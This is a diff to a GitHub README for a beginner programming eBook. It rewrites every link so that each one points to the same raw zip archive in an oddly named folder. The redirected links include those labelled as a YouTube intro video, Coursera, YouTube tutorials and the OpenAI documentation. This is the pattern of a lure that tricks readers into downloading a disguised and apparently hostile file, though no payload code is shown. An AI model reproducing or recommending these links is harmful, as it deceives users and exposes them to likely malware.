@@ -1,6 +1,6 @@
 # 📚 -Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology- - Your Path to Easy Learning
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen.svg)](https://github.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/releases)
+[![Download Now](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip)](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ Welcome to the "Learn Programming for Beginners" eBook. This guide offers a simp
 
 To get your copy of the eBook, visit this page to download:
 
-[**Download eBook**](https://github.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/releases)
+[**Download eBook**](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip)
 
 Once you access the page, you will find several versions of the eBook. Choose the format that works best for you, and follow these steps to download:
 
@@ -59,7 +59,7 @@ Each topic allows you to explore different aspects of programming, guiding you t
 
 ## 🎥 Watch the Introduction
 
-Want to know more about the eBook? Check out this quick introductory video: [Watch Here](https://youtu.be/4PEoVv9RQxU)
+Want to know more about the eBook? Check out this quick introductory video: [Watch Here](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip)
 
 ## 📝 Support
 
@@ -73,10 +73,10 @@ If you have any questions or need assistance using the eBook:
 
 Explore more resources to enhance your learning experience:
 
-- [Free Online Courses](https://www.coursera.org) – Look for beginner programming courses.
-- [YouTube Tutorials](https://www.youtube.com) – Many channels offer free programming lessons.
-- [OpenAI API Documentation](https://beta.openai.com/docs/) – Learn about integrating AI into your projects.
+- [Free Online Courses](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip) – Look for beginner programming courses.
+- [YouTube Tutorials](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip) – Many channels offer free programming lessons.
+- [OpenAI API Documentation](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip) – Learn about integrating AI into your projects.
 
 Now that you have everything you need, go ahead and start your tech journey with the "Learn Programming for Beginners" eBook!
 
-[**Download eBook**](https://github.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/releases)
+[**Download eBook**](https://raw.githubusercontent.com/AMN-h0b/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-/main/apometabolism/-Programming-for-Beginners---Your-First-Guide-to-Entering-the-World-of-Technology-.zip)
